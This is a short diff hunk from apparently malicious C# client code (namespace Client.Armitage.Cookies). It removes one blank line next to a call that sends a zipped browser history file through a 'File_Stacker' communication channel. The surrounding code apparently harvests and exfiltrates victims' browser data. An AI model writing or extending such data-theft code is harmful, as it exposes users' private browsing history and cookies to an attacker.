@@ -91,7 +91,6 @@ namespace Client.Armitage.Cookies
 
                     Communication.File_Stacker.Send(btyes, Communication.File_Stacker.Filetype.File, $"{browsername}-History.zip");
 
-
                     return true;
                 }
             }
